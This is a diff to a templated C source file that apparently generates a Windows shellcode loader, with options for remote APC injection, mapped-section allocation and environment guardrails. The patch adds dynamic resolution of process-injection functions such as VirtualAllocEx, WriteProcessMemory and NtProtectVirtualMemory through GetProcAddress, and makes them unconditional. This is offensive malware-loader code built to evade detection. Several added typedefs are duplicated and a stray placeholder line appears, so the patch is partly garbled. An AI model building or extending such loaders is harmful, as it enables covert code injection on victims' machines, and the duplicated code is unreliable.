@@ -11,6 +11,10 @@ typedef HANDLE (WINAPI *pCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWOR
 typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
 typedef NTSTATUS (WINAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
 typedef NTSTATUS (WINAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, UINT, ULONG, ULONG);
+typedef NTSTATUS (WINAPI* pNtQueryVirtualMemory)(HANDLE, PVOID, int, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS (WINAPI* pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS (WINAPI* pNtQueryVirtualMemory)(HANDLE, PVOID, int, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS (WINAPI* pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
 typedef HANDLE (WINAPI *pGetProcessHeap)(VOID);
 typedef LPVOID (WINAPI *pHeapAlloc)(HANDLE, DWORD, SIZE_T);
 typedef BOOL (WINAPI *pHeapFree)(HANDLE, DWORD, LPVOID);
@@ -22,16 +26,20 @@ typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
 typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef VOID (WINAPI* pRtlZeroMemory)(PVOID, SIZE_T);
 typedef DWORD (WINAPI *pSleepEx)(DWORD, BOOL);
+// ...
 typedef BOOL (WINAPI *pGetComputerNameA)(LPSTR, LPDWORD);
+typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
+typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
+typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
 {% if execution_method == 'remoteapc' or guardrails_needed %}
 typedef int (WINAPI* pLstrlenA)(LPCSTR);
 typedef DWORD (WINAPI* pGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
 {% endif %}
 {% if execution_method == 'remoteapc' %}
 typedef BOOL (WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
-typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
-typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
 typedef DWORD (WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
 typedef DWORD (WINAPI* pResumeThread)(HANDLE);
 typedef DWORD (WINAPI* pGetLastError)(VOID);
@@ -75,6 +83,8 @@ pCreateFileMappingW pfnCreateFileMappingW;
 pMapViewOfFile pfnMapViewOfFile;
 pNtCreateSection pfnNtCreateSection;
 pNtMapViewOfSection pfnNtMapViewOfSection;
+pNtQueryVirtualMemory pfnNtQueryVirtualMemory;
+pNtProtectVirtualMemory pfnNtProtectVirtualMemory;
 pGetProcessHeap pfnGetProcessHeap;
 pHeapAlloc pfnHeapAlloc;
 pHeapFree pfnHeapFree;
@@ -88,15 +98,15 @@ pRtlMoveMemory pfnRtlMoveMemory;
 pRtlZeroMemory pfnRtlZeroMemory;
 pSleepEx pfnSleepEx;
 pGetComputerNameA pfnGetComputerNameA;
+pVirtualAllocEx pfnVirtualAllocEx;
+pWriteProcessMemory pfnWriteProcessMemory;
+pVirtualProtectEx pfnVirtualProtectEx;
 {% if execution_method == 'remoteapc' or guardrails_needed %}
 pLstrlenA pfnLstrlenA;
 pGetEnvironmentVariableA pfnGetEnvironmentVariableA;
 {% endif %}
 {% if execution_method == 'remoteapc' %}
 pCreateProcessA pfnCreateProcessA;
-pVirtualAllocEx pfnVirtualAllocEx;
-pWriteProcessMemory pfnWriteProcessMemory;
-pVirtualProtectEx pfnVirtualProtectEx;
 pQueueUserAPC pfnQueueUserAPC;
 pResumeThread pfnResumeThread;
 pGetLastError pfnGetLastError;
@@ -151,14 +161,14 @@ void ResolveAPIs() {
     pfnGetFileSize = (pGetFileSize)pfnGetProcAddress(hKernel32, "GetFileSize");
     pfnReadFile = (pReadFile)pfnGetProcAddress(hKernel32, "ReadFile");
     pfnSleepEx = (pSleepEx)pfnGetProcAddress(hKernel32, "SleepEx");
+    pfnVirtualAllocEx = (pVirtualAllocEx)pfnGetProcAddress(hKernel32, "VirtualAllocEx");
+    pfnWriteProcessMemory = (pWriteProcessMemory)pfnGetProcAddress(hKernel32, "WriteProcessMemory");
+    pfnVirtualProtectEx = (pVirtualProtectEx)pfnGetProcAddress(hKernel32, "VirtualProtectEx");
 
     {% if execution_method == 'remoteapc' %}
     pfnLstrlenA = (pLstrlenA)pfnGetProcAddress(hKernel32, "lstrlenA");
     pfnGetEnvironmentVariableA = (pGetEnvironmentVariableA)pfnGetProcAddress(hKernel32, "GetEnvironmentVariableA");
     pfnCreateProcessA = (pCreateProcessA)pfnGetProcAddress(hKernel32, "CreateProcessA");
-    pfnVirtualAllocEx = (pVirtualAllocEx)pfnGetProcAddress(hKernel32, "VirtualAllocEx");
-    pfnWriteProcessMemory = (pWriteProcessMemory)pfnGetProcAddress(hKernel32, "WriteProcessMemory");
-    pfnVirtualProtectEx = (pVirtualProtectEx)pfnGetProcAddress(hKernel32, "VirtualProtectEx");
     pfnQueueUserAPC = (pQueueUserAPC)pfnGetProcAddress(hKernel32, "QueueUserAPC");
     pfnResumeThread = (pResumeThread)pfnGetProcAddress(hKernel32, "ResumeThread");
     pfnGetLastError = (pGetLastError)pfnGetProcAddress(hKernel32, "GetLastError");
@@ -175,6 +185,8 @@ void ResolveAPIs() {
     if (hNtdll == NULL) { return; }
     pfnRtlMoveMemory = (pRtlMoveMemory)pfnGetProcAddress(hNtdll, "RtlMoveMemory");
     pfnRtlZeroMemory = (pRtlZeroMemory)pfnGetProcAddress(hNtdll, "RtlZeroMemory");
+    pfnNtQueryVirtualMemory = (pNtQueryVirtualMemory)pfnGetProcAddress(hNtdll, "NtQueryVirtualMemory");
+    pfnNtProtectVirtualMemory = (pNtProtectVirtualMemory)pfnGetProcAddress(hNtdll, "NtProtectVirtualMemory");
 
     {% if execution_method == 'remoteapc' or allocation_method == 'mappedsection' %}
         pfnNtCreateSection = (pNtCreateSection)pfnGetProcAddress(hNtdll, "NtCreateSection");
